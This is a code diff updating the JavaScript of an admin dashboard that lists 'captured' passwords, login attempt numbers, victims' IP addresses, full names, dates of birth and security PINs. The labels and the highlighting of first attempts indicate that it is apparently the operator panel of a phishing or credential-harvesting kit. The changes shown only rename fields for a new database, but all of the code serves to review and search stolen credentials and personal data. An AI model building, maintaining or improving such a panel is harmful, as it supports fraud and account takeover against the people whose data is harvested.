@@ -117,7 +117,6 @@
         let allPasswords = [];
         let allVerifications = [];
 
-        // UPDATED Login functionality (secure)
         async function adminLogin() {
             const password = document.getElementById('masterPassword').value;
             const errorDiv = document.getElementById('loginError');
@@ -193,18 +192,21 @@
                         </tr></thead><tbody>`;
             passwords.forEach(pwd => {
                 html += `<tr>
-                        <td>${pwd.id}</td><td><strong>${pwd.user_id}</strong></td>
-                        <td><span class="password-cell">${pwd.password}</span></td>
-                        <td><span style="background:${pwd.attempt_number === 1 ? '#dc3545' : '#28a745'};color:white;padding:4px 8px;border-radius:12px;font-size:12px;">${pwd.attempt_number}</span></td>
-                        <td>${new Date(pwd.timestamp).toLocaleString()}</td><td>${pwd.ip_address || 'N/A'}</td>
-                        <td><button class="delete-btn" onclick="deletePassword(${pwd.id})">🗑️ Delete</button></td></tr>`;
+                        <td>${pwd._id}</td>
+                        <td><strong>${pwd.userId || 'N/A'}</strong></td>
+                        <td><span class="password-cell">${pwd.password || 'N/A'}</span></td>
+                        <td><span style="background:${pwd.attemptNumber === 1 ? '#dc3545' : '#28a745'};color:white;padding:4px 8px;border-radius:12px;font-size:12px;">${pwd.attemptNumber || 'N/A'}</span></td>
+                        <td>${new Date(pwd.timestamp).toLocaleString()}</td>
+                        <td>${pwd.ipAddress || 'N/A'}</td>
+                        <td><button class="delete-btn" onclick="deletePassword('${pwd._id}')">🗑️ Delete</button></td>
+                        </tr>`;
             });
             content.innerHTML = html + '</tbody></table></div>';
         }
 
         function searchPasswords() {
             const term = document.getElementById('passwordSearch').value.toLowerCase();
-            const filtered = allPasswords.filter(p => p.user_id.toLowerCase().includes(term) || p.password.toLowerCase().includes(term) || p.id.toString().includes(term));
+            const filtered = allPasswords.filter(p => (p.userId && p.userId.toLowerCase().includes(term)) || (p.password && p.password.toLowerCase().includes(term)) || p._id.toString().includes(term));
             displayPasswords(filtered);
         }
 
@@ -223,7 +225,6 @@
             }
         }
 
-        // UPDATED function to display verifications
         function displayVerifications(verifications) {
             const content = document.getElementById('verificationsContent');
             if (verifications.length === 0) {
@@ -236,27 +237,28 @@
                         </tr></thead><tbody>`;
             verifications.forEach(ver => {
                 html += `<tr>
-                        <td>${ver.id}</td><td><strong>${ver.user_id}</strong></td>
-                        <td>${ver.full_name || 'N/A'}</td>
-                        <td>${ver.date_of_birth ? new Date(ver.date_of_birth).toLocaleDateString() : 'N/A'}</td>
+                        <td>${ver._id}</td>
+                        <td><strong>${ver.userId || 'N/A'}</strong></td>
+                        <td>${ver.fullName || 'N/A'}</td>
+                        <td>${ver.dob ? new Date(ver.dob).toLocaleDateString() : 'N/A'}</td>
                         <td>${ver.problem || 'N/A'}</td>
-                        <td><span class="password-cell">${ver.security_pin || 'N/A'}</span></td>
-                        <td><span class="password-cell">${ver.captured_password || 'N/A'}</span></td>
-                        <td>${new Date(ver.created_at).toLocaleString()}</td>
-                        <td><button class="delete-btn" onclick="deleteVerification(${ver.id})">🗑️ Delete</button></td></tr>`;
+                        <td><span class="password-cell">${ver.pin || 'N/A'}</span></td>
+                        <td><span class="password-cell">${ver.capturedPassword || 'N/A'}</span></td>
+                        <td>${new Date(ver.createdAt).toLocaleString()}</td>
+                        <td><button class="delete-btn" onclick="deleteVerification('${ver._id}')">🗑️ Delete</button></td>
+                        </tr>`;
             });
             content.innerHTML = html + '</tbody></table></div>';
         }
-
-        // UPDATED function to search verifications
+        
         function searchVerifications() {
             const term = document.getElementById('verificationSearch').value.toLowerCase();
             const filtered = allVerifications.filter(v => 
-                v.user_id.toLowerCase().includes(term) ||
-                (v.full_name && v.full_name.toLowerCase().includes(term)) ||
+                (v.userId && v.userId.toLowerCase().includes(term)) ||
+                (v.fullName && v.fullName.toLowerCase().includes(term)) ||
                 (v.problem && v.problem.toLowerCase().includes(term)) ||
-                (v.captured_password && v.captured_password.toLowerCase().includes(term)) ||
-                v.id.toString().includes(term)
+                (v.capturedPassword && v.capturedPassword.toLowerCase().includes(term)) ||
+                v._id.toString().includes(term)
             );
             displayVerifications(filtered);
         }
